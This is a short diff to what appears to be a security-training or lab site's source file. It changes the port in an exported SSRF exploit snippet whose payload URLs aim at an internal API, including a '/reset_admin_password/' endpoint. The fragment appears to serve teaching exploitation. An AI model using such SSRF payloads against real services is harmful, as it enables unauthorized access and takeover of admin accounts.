@@ -234,8 +234,8 @@ change_password(cookies, password)`
 export const ssrfWebhookExploitSnippet = `
 for url_payload in [
     "http://internal_api",
-    "http://internal_api:12301",
-    "http://internal_api:12301/reset_admin_password/",
+    "http://internal_api:12302",
+    "http://internal_api:12302/reset_admin_password/",
 ]:
     data = {"url": url_payload}
 
